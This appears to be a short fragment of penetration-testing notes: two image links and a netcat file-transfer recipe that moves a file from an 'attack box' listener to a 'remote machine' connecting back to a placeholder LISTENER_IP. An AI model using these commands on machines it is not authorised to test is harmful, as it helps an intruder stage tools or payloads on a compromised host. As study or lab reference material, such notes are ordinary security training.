...
[![file:///tmp/.NJVDN2/1.png](file:///tmp/.NJVDN2/1.png)](https://i.imgur.com/bQnFz1T.png)
...
[![file:///tmp/.NJVDN2/2.png](file:///tmp/.NJVDN2/2.png)](https://i.imgur.com/7aOKtlO.png)
...
**File Transfer (Attack Box)**
`	nc -lvnp PORT **<** filename`
**File Transfer (Remote Machine)**
`	nc -w3 LISTENER_IP PORT **>** filename`
